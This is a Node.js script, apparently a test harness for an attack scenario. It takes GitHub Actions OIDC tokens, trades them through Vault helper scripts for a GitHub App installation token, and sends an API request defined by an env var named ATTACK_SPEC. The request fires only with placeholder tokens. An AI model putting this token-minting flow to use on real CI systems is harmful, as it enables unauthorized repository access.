import { spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

// @actions/core 1.10.1 getInput: INPUT_ + name with spaces as underscores, uppercased.
function getInput(name) {
  const val = process.env[`INPUT_${name.replace(/ /g, "_").toUpperCase()}`] || "";
  return val.trim();
}

// @octokit/auth-token 4.0.0 withAuthorizationPrefix.
function withAuthorizationPrefix(token) {
  if (token.split(/\./).length === 3) {
    return `bearer ${token}`;
  }
  return `token ${token}`;
}

// @actions/core 1.10.1 OidcClient.getIDToken URL and bearer header.
async function oidc(audience) {
  const requestToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  if (!requestToken) {
    throw new Error("Unable to get ACTIONS_ID_TOKEN_REQUEST_TOKEN env variable");
  }
  let idTokenURL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
  if (!idTokenURL) {
    throw new Error("Unable to get ACTIONS_ID_TOKEN_REQUEST_URL env variable");
  }
  if (audience) {
    idTokenURL = `${idTokenURL}&audience=${encodeURIComponent(audience)}`;
  }
  const res = await fetch(idTokenURL, { headers: { Authorization: `Bearer ${requestToken}` } });
  if (!res.ok) {
    throw new Error(`Failed to get ID Token. status ${res.status}`);
  }
  const body = await res.json();
  if (!body.value) {
    throw new Error("Response json body do not have ID Token field");
  }
  return body.value;
}

function outputValue(script, env, key) {
  const dir = mkdtempSync(join(tmpdir(), "gha-"));
  const output = join(dir, "github_output");
  writeFileSync(output, "");
  const result = spawnSync("bash", [script], {
    env: { ...process.env, ...env, GITHUB_OUTPUT: output },
    encoding: "utf8",
  });
  if (result.status !== 0) {
    throw new Error(`${script} exited ${result.status}\n${result.stdout}\n${result.stderr}`);
  }
  const line = readFileSync(output, "utf8")
    .split("\n")
    .find((entry) => entry.startsWith(`${key}=`));
  if (!line) {
    throw new Error(`${key} missing from ${script}`);
  }
  return line.slice(key.length + 1);
}

function workflowRefSha() {
  const result = spawnSync("bash", [process.env.NORMALIZE_SCRIPT], {
    env: { ...process.env, WORKFLOW_REF: process.env.GITHUB_WORKFLOW_REF },
    encoding: "utf8",
  });
  if (result.status !== 0) {
    throw new Error(result.stderr || "normalize_ref failed");
  }
  return result.stdout.trim();
}

async function mintInstallationToken(spec) {
  const refSha = workflowRefSha();
  const proxyAudience = "vault-github-actions-grafana-ops";
  const vaultAudience = "https://vault-github-actions.grafana-ops.net";
  const proxyJwt = await oidc(proxyAudience);
  const vaultJwt = await oidc(vaultAudience);
  const common = {
    VAULT_URL: process.env.VAULT_URL,
    REPOSITORY_NAME: spec.repositoryName,
    REF_SHA: refSha,
    PERMISSION_SET: spec.permissionSet,
    GITHUB_APP: spec.githubApp,
    GITHUB_JWT_PROXY: proxyJwt,
  };
  const vaultToken = outputValue(process.env.AUTH_VAULT_SCRIPT, { ...common, GITHUB_JWT_VAULT: vaultJwt }, "vault_token");
  return outputValue(process.env.CREATE_TOKEN_SCRIPT, { ...common, VAULT_TOKEN: vaultToken }, "github_token");
}

const spec = JSON.parse(process.env.ATTACK_SPEC);
if (process.env.MODE === "mint") {
  const token = await mintInstallationToken(spec);
  writeFileSync(process.env.MINT_RESULT, token);
  process.exit(0);
}

let token = getInput("github-token");
if (!token.startsWith("placeholder-installation-") && process.env.ACTIONS_ID_TOKEN_REQUEST_URL) {
  token = await mintInstallationToken(spec);
}
if (!token.startsWith("placeholder-installation-")) {
  process.exit(0);
}

const response = await fetch(`${process.env.GITHUB_API_URL}${spec.path}`, {
  method: spec.method,
  headers: {
    Authorization: withAuthorizationPrefix(token),
    Accept: "application/vnd.github+json",
    "Content-Type": "application/json",
  },
  body: JSON.stringify(spec.body),
});
if (!response.ok && response.status !== 204) {
  throw new Error(`dispatch status ${response.status}`);
}
